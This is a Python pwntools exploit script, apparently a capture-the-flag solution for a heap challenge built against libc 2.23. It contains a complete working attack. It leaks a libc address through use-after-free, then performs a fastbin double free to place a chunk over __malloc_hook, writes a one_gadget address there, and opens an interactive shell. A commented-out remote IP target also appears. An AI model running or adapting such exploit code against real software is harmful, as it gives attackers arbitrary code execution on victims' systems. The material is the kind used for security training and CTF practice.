from pwn import*

p = process('./vuln_patched')
#p = remote("112.126.101.96",9999)

a = ELF("./libc-2.23.so")
elf = ELF("./vuln")
context.log_level = 'debug'


def add(leng,content,index):
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Size:")
    p.sendline(str(leng))
    p.recvuntil("Content:")
    p.sendline(content)
def edit(idx):
    p.recvuntil("[Q]uit\n>")
    p.sendline("C")
    p.recvuntil("index>")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(idx))


add(0x80,'abc',0)
add(0x80,'abc',7)
gdb.attach(p,'b *0x400b02')
delete(0)
show(0)
address = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00"))
print ("address:" + hex(address))

libc_base = address - 0x3c4b20
add(0x60,'/bin/sh',1) #1
add(0x60,'/bin/sh',2) #2

delete(1)
delete(2)
delete(1)

sys_addr = libc_base + a.sym['system']
one =  libc_base+0x45226
__malloc_hook=libc_base+a.sym['__malloc_hook']
hackadd = __malloc_hook - 0x20 - 0x3

add(0x40,p64(hackadd),3) #3
add(0x40,'/bin/sh\x00',4) #4
add(0x40,p64(hackadd),5) #5
add(0x40,b'a'*(0xb + 0x8)+p64(one),6)
p.interactive()
